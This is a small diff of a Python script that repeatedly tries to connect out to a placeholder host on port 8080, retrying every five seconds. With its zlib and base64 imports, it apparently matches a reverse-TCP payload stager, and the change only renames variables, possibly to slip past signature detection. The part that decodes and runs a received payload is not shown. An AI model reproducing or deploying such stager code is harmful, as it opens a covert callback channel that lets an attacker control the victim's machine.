@@ -4,10 +4,10 @@ import time
 import zlib
 import base64
 
-for x in range(10):
+for a in range(10):
 	try:
-		s = socket.socket(2,socket.SOCK_STREAM)
-		s.connect(("IPv4", 8080))
+		so = socket.socket(2,socket.SOCK_STREAM)
+		so.connect(("IPv4", 8080))
 		break
 	except:
 		time.sleep(5)
